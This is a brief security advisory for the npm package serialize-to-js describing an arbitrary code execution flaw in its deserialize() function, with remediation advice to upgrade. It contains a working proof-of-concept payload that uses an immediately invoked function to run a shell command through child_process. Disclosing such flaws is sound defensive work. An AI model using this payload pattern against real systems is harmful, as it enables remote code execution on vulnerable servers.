## Overview
[`serialize-to-js`](https://www.npmjs.com/package/serialize-to-js) serializes objects to javascript.

Affected versions of this package are vulnerable to Arbitrary Code Execution. If untrusted user-input is passed into the `deserialize()`, attackers will be able to send a serialized JavaScript Objects with an [Immediately Invoked Function Expression (IIFE)](https://en.wikipedia.org/wiki/Immediately-invoked_function_expression).

**Example:**
```js
var serialize = require('serialize-to-js');
var payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
serialize.deserialize(payload);
```

## Remediation
Upgrade `serialize-to-js` to version 1.0.0 or higher.
